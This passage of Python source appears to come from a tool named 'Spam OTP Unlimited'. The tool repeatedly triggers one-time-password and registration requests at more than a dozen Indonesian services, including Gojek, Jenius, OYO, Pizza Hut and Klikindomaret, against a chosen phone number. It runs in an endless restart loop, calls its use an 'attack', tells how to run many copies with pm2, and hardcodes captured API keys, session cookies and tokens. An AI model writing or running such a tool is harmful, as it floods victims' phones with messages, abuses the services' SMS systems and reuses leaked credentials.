            # Ginee                                  =  requests.post("https://accounts.ginee.com/api/iam-service/account/send-verification-code",headers={"Host":"accounts.ginee.com","Connection":"keep-alive","Content-Length":"114","Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Accept-Language":"en","sec-ch-ua-mobile":"?1","User-Agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","sec-ch-ua-platform":"Android","Origin":"https://accounts.ginee.com","Sec-Fetch-Site":"same-origin","Sec-Fetch-Mode":"cors","Sec-Fetch-Dest":"empty","Referer":"https://accounts.ginee.com/accounts/registered?system_id=SAAS&from=OFFICIAL_SITE&country=ID&utm_source=Article&utm_campaign=Ginee_ID","Accept-Encoding":"gzip, deflate, br"},data=json.dumps({"account":"0"+nomor,"countryCode":"ID","verificationPurpose":"USER_REGISTRATION","verificationType":"PHONE"})).text
            Misteraladin = requests.post(
                "https://m.misteraladin.com/api/members/v2/otp/request",
                headers={
                    "Host": "m.misteraladin.com",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                    "x-platform": "mobile-web",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://m.misteraladin.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.misteraladin.com/account",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "phone_number_country_code": "62",
                    "phone_number": nomor,
                    "type": "register"
                })).text

            autoTyping(f"{green}Success Send Spam to {yellow}{nomor} ")

        except requests.exceptions.ConnectionError:  # Error Handling Ketika Request Time Out di salah satu URL API
            if RTO_flag == 0:
                print("")
                autoTyping("--Request Time Out--"
                           )  # Flag ketika memasuki RTO di salah satu URL API
                print(
                    f"{white}Proses Automatis dialihkan ke Requests Alternatif{green}")

            Indo_from30 = requests.get(
                "https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP="
                + nomor,
                headers={
                    "Host":
                    "account-api-v1.klikindomaret.com",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "content-type":
                    "application/json",
                    "accept":
                    "*/*",
                    "origin":
                    "https://account.klikindomaret.com",
                    "referer":
                    "https://account.klikindomaret.com/SMSVerification?nohp=" + nomor +
                    "&type=register",
                    "accept-encoding":
                    "gzip, deflate, br",
                    "accept-language":
                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                }).text
            Wa2_from30 = requests.post(
                "https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==",
                data={
                    "namaDepan": "Tahalu" + str(random.randrange(11, 99999)),
                    "emailNope": nomor,
                    "password": "Indo" + str(random.randrange(111, 999)),
                    "konfirmasiPass": "Indo" + str(random.randrange(111, 999))
                },
                headers={
                    "Host":
                    "qtva.id",
                    "Connection":
                    "keep-alive",
                    "Accept":
                    "text/html, */*; q=0.01",
                    "X-Requested-With":
                    "XMLHttpRequest",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type":
                    "application/x-www-form-urlencoded; charset=UTF-8",
                    "Origin":
                    "https://qtva.id",
                    "Referer":
                    "https://qtva.id/page/register/siswa",
                    "Accept-Encoding":
                    "gzip, deflate, br",
                    "Accept-Language":
                    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                    "Cookie":
                    "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"
                }).text
            Jadgreward = json.loads(
                requests.get(
                    f"https://id.jagreward.com/member/verify-mobile/{b}").text)
            Kredito = requests.post(
                "https://app-api.kredito.id/client/v1/common/verify-code/send",
                '{"event":"default_verification","mobilePhone":"%s","sender":"jatissms"}'
                % (b),
                headers={
                    "LPR-TIMESTAMP": "1603281035821",
                    "Accept-Language": "id-ID",
                    "LPR-BRAND": "Kredito",
                    "LPR-PLATFORM": "android",
                    "User-Agent":
                    "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android",
                    "Authorization":
                    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
                    "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
                    "Content-Type": "application/json; charset=UTF-8",
                    "Content-Length": "79"
                }).text
            Gojek = requests.post("https://api.gojekapi.com/v5/customers",
                                  data={
                                      "email": "nsjwwiwiwisnsnn12@gmail.com",
                                      "name": "akuinginterbang12",
                                      "phone": c,
                                      "signed_up_country": "ID"
                                  },
                                  headers={
                                      "X-Session-ID":
                                      "f8b67b26-c6a4-44d2-9d86-8d93a80901c9",
                                      "X-Platform": "Android",
                                      "X-UniqueId": "8606f4e3b85968fd",
                                      "X-AppVersion": "3.52.2",
                                      "X-AppId": "com.gojek.app",
                                      "Accept": "application/json",
                                      "Authorization": "Bearer",
                                      "X-User-Type": "customer",
                                      "Accept-Language": "id-ID",
                                      "X-User-Locale": "id_ID",
                                      "Host": "api.gojekapi.com",
                                      "Connection": "Keep-Alive",
                                      "Accept-Encoding": "gzip",
                                      "User-Agent": "okhttp/3.12.1"
                                  }).text
            Harvestcake = requests.post(
                "https://harvestcakes.com/register",
                data={
                    "phone": b
                },
                headers={
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                }).text
            Oyo = requests.post(
                "https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id",
                data=json.dumps({
                    "phone": b,
                    "country_code": "+62",
                    "country_iso_code": "ID",
                    "nod": "4",
                    "send_otp": "true",
                    "devise_role": "Consumer_Guest"
                }),
                headers={
                    "Host": "identity-gateway.oyorooms.com",
                    "consumer_host": "https://www.oyorooms.com",
                    "accept-language": "id",
                    "access_token":
                    "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                    "User-Agent":
                    "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                    "Content-Type": "application/json",
                    "accept": "*/*",
                    "origin": "https://www.oyorooms.com",
                    "referer": "https://www.oyorooms.com/login",
                    "Accept-Encoding": "gzip,deflate,br"
                }).text
            Foa = requests.post(
                'https://foreignadmits.com/api/register-otp-generate-student',
                data={
                    'mobile': f'62{nomor[1:]}',
                    'countryCode': '+62'
                }).text
            Tokko_wa = requests.post(
                "https://api.tokko.io/graphql",
                headers={
                    "Host": "api.tokko.io",
                    "content-length": "306",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "x-tokko-api-client": "merchant_web",
                    "content-type": "application/json",
                    "accept": "*/*",
                    "x-tokko-api-client-version": "4.5.1",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://web.lummoshop.com",
                    "sec-fetch-site": "cross-site",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://web.lummoshop.com/",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "operationName":
                    "generateOTP",
                    "variables": {
                        "generateOtpInput": {
                            "phoneNumber": "+62" + nomor,
                            "hashCode": "",
                            "channel": "WHATSAPP",
                            "userType": "MERCHANT"
                        }
                    },
                    "query":
                    "mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"
                })).text
            Carsome_wa = requests.post(
                "https://www.carsome.id/website/login/sendSMS",
                headers={
                    "Host": "www.carsome.id",
                    "content-length": "38",
                    "x-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "country": "ID",
                    "x-amplitude-device-id": "A4p3vs1Ixu9wp3wFmCEG9K",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://www.carsome.id",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://www.carsome.id/",
                    "accept-encoding": "gzip, deflate, br",
                    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                },
                data=json.dumps({
                    "username": nomor,
                    "optType": 1
                })).text
            Jenius = requests.post(
                "https://api.btpn.com/jenius",
                json.dumps({
                    "query":
                    "mutation registerPhone($phone: String!,$language: Language!) {\n  registerPhone(input: {phone: $phone,language: $language}) {\n    authId\n    tokenId\n    __typename\n  }\n}\n",
                    "variables": {
                        "phone": "+62" + nomor,
                        "language": "id"
                    },
                    "operationName": "registerPhone"
                }),
                headers={
                    "accept": "*/*",
                    "btpn-apikey": "f73eb34d-5bf3-42c5-b76e-271448c2e87d",
                    "version": "2.36.1-7565",
                    "accept-language": "id",
                    "x-request-id": "d7ba0ec4-ebad-4afd-ab12-62ce331379be",
                    "Content-Type": "application/json",
                    "Host": "api.btpn.com",
                    "Connection": "Keep-Alive",
                    "Accept-Encoding": "gzip",
                    "Cookie":
                    "c6bc80518877dd97cd71fa6f90ea6a0a=24058b87eb5dac1ac1744de9babd1607",
                    "User-Agent": "okhttp/3.12.1"
                }).text
            Pizzahut = requests.post(
                'https://api-prod.pizzahut.co.id/customer/v1/customer/register',
                headers={
                    'Host': 'api-prod.pizzahut.co.id',
                    'content-length': '157',
                    'x-device-type': 'PC',
                    'sec-ch-ua-mobile': '?1',
                    'x-platform': 'WEBMOBILE',
                    'x-channel': '2',
                    'content-type': 'application/json;charset=UTF-8',
                    'accept': 'application/json',
                    'x-client-id': 'b39773b0-435b-4f41-80e9-163eef20e0ab',
                    'user-agent':
                    'Mozilla/5.0 (Linux; Android 11; vivo 2007) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
                    'x-lang': 'en',
                    'save-data': 'on',
                    'x-device-id': 'web',
                    'origin': 'https://www.pizzahut.co.id',
                    'sec-fetch-site': 'same-site',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-dest': 'empty',
                    'referer': 'https://www.pizzahut.co.id/',
                    'accept-encoding': 'gzip, deflate, br',
                    'accept-language': 'id-ID,id;q=0.9,en;q=0.8'
                },
                data=json.dumps({
                    "email": "aldigg088@gmail.com",
                    "first_name": "Xenzi",
                    "last_name": "Wokwokw",
                    "password": "Aldi++\\/67",
                    "phone": "0" + nomor,
                    "birthday": "2000-01-02"
                })).text
            Misteraladin = requests.post(
                "https://m.misteraladin.com/api/members/v2/otp/request",
                headers={
                    "Host": "m.misteraladin.com",
                    "accept-language": "id",
                    "sec-ch-ua-mobile": "?1",
                    "content-type": "application/json",
                    "accept": "application/json, text/plain, */*",
                    "user-agent":
                    "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
                    "x-platform": "mobile-web",
                    "sec-ch-ua-platform": "Android",
                    "origin": "https://m.misteraladin.com",
                    "sec-fetch-site": "same-origin",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-dest": "empty",
                    "referer": "https://m.misteraladin.com/account",
                    "accept-encoding": "gzip, deflate, br"
                },
                data=json.dumps({
                    "phone_number_country_code": "62",
                    "phone_number": nomor,
                    "type": "register"
                })).text

            autoTyping(f"{green}Success Send Spam to {yellow}{nomor} ")
            RTO_flag = 1
            rto = 1  # Flag tunda

        except requests.exceptions.ConnectionError:
            print("")
            autoTyping("--Fail to establish a new connection--")
            time.sleep(1)  # Tunda 1000 detik
            rto = 1

        except urllib3.exceptions.NewConnectionError:  # Error Handling 2 ketika masih terjadi error berlebihan
            print("")
            autoTyping("--Fail to establish a new connection--")
            time.sleep(1)
            rto = 1

        except TimeoutError:
            print("")
            autoTyping(
                "--A Connection attempt failed because the connected party did not properly respond after a period of time--"
            )
            time.sleep(1)
            rto = 1

        except urllib3.request.HTTPError:
            print("")
            autoTyping(
                "--A Connection attempt failed because the connected party did not properly respond after a period of time--"
            )
            time.sleep(1)
            rto = 1

        except urllib3.exceptions.ProtocolError:
            print("")
            autoTyping(
                "--A Connection attempt failed because the connected party did not properly respond after a period of time--"
            )
            time.sleep(1)
            rto = 1

        except KeyboardInterrupt:
            print("")
            tanya(nomor)
    if rto == 1:
        time.sleep(1)
        startProcess(nomor, 1)
    else:
        startProcess(nomor, 1)


def startProcess(nomor, x):
    if x == 0:  
        autoTyping(f"{red}Infinite Loop Spam to {white}{nomor} {red}is {green}Ready!{green}")
        startAPI(nomor)
    else:
        autoTyping("\n--reboot wait 3 second-- ")
        time.sleep(3)  
        autoTyping(f"{red}Trying Spam to Number : {nomor}.....{green}")
        startAPI(nomor)


def banner():
    os.system("cls||clear")
    __banner__ = pyfiglet.figlet_format("Spam OTP Unlimited", font="slant", justify="center")
    print(red + __banner__)
    print(f"\t\t\t{red}[ {white}Created By X - ZhnDvs {red}]")
    print(f"\t    {red}[ {white}A Tool Spam OTP Unlimited Integrated with API Multi Provider{red}]\n")


def main():
    banner()
    number = argv[1]
    print(f"""{green}Starting Attack to : {yellow}{number}\n""")
    startProcess(number, 0)


if __name__ == "__main__":

    # If you want to make multi process, you can type in your terminal 
    # - pm2 start main.py --name=variable --interpreter=python3 --restart-delay=timedelay (ex : 30000ms) target number (ex : 08xxxxx)
    # variable --name is up to you, example spam_otp1
    # Please read the Readme.md for more information this tool

    try:
        main()
    except KeyboardInterrupt:
        autoTyping(f"""{red}Process End...{green}Thank You For Using My Tools... See you again----""")
        sys.exit()
